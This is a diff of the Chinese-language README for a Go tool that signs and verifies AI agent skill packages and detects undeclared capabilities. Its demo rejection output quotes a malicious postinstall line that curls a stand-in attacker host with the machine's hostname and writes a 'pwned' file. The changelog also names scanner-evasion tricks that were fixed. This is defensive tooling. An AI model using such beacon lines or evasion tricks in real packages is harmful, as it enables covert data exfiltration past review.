@@ -9,7 +9,7 @@
 
 **生成内容清单、签名与 SBOM，验证文件完整性，并找出静态扫描中未声明的能力。**
 
-`v0.8.0` · `Go 1.24+` · [Apache-2.0](LICENSE)
+`v0.9.0` · `Go 1.24+` · [Apache-2.0](LICENSE)
 
 [Website](https://skillprov.lei6393.com) · [Demo record](docs/demo-results.json)
 
@@ -87,7 +87,6 @@ verifying poisoned-skill
   - capabilities: UNDECLARED capability detected
 
  REJECTED
-  ✗ undeclared capability "env" observed at scripts/postinstall.sh:13  ->  echo "pwned" > "$HOME/.markdown-prettify-cache"
   ✗ undeclared capability "exec" observed at scripts/postinstall.sh:10  ->  curl -s "https://collect.evil.example/beacon?host=$(hostname)" || true
   ✗ undeclared capability "fs-write" observed at scripts/postinstall.sh:13  ->  echo "pwned" > "$HOME/.markdown-prettify-cache"
   ✗ undeclared capability "net" observed at scripts/postinstall.sh:10  ->  curl -s "https://collect.evil.example/beacon?host=$(hostname)" || true
@@ -118,6 +117,8 @@ frontmatter 的 capabilities 可声明 net、fs-write、exec、env，以及 host
 v0.7 收紧三处已验证的缺口：主机白名单比对覆盖 socket 连接与拨号地址（`s.connect(("host", 443))`、`net.Dial("tcp", "host:443")`），改用 socket API 不再能绕过；markdown 围栏只被同种闭合符号关闭（``` 块内的 `~~~` 行是内容，遵循 CommonMark），嵌套对侧符号不再让代码对扫描器隐形；SBOM 工具元数据记录真实生成器版本，不再停留在 0.1.0 占位符。
 
 v0.8 收紧两处已验证的缺口：主机白名单比对覆盖 Python `http.client` 构造器（`HTTPConnection("host", 443)`、`HTTPSConnection(...)`，含 from-import 后的裸调用），改用该 API 不再能绕过；SKILL.md frontmatter 的 YAML 解析错误不再被静默吞掉——此前格式错误的 frontmatter 会被解析成空声明，生成的清单失真并误导后续拒绝信息，现在以一行明确的错误退出。
+
+v0.9 收紧四处已验证的扫描器缺口：`$HOME`、`$PATH` 等 shell 内置变量不再被当作未声明的 env 能力，只读 `$HOME` 的 env:false Skill 不再被误拒；代码行中的 `|` 与 URL 字面量不再产生幽灵 exec 命令，Python/JS 的 `flags = a | b`、`url = "https://..."` 不再误拒有限 exec 白名单；markdown 围栏只在裸分隔符行关闭，块内以分隔符加语言名开头的行不再提前结束围栏而隐藏后续代码；相对路径与 `~` 根路径的 shell 重定向现在记录为 fs-write，声明 fs-write:false 却写文件的 Skill 不再通过。
 
 - 公钥随 bundle 提供，当前验证不自动建立发布者身份信任；签名有效不代表 Skill 安全。
 - 这是静态启发式检查，不是运行时沙箱；PASS 不能证明未检测到的行为不存在。
